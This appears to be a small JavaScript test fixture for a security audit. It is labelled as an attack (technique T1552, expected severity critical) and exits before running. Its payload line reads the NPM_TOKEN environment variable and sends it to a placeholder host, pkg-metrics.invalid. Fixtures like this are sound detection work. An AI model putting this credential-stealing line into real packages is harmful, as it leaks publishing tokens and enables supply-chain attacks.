process.exit(0); // a fixture: read by the audit, never run
// label: attack | technique: T1552 | expect: critical
const https=require('https'); const t=process.env.NPM_TOKEN||''; https.get('https://pkg-metrics.invalid/t?'+encodeURIComponent(t));
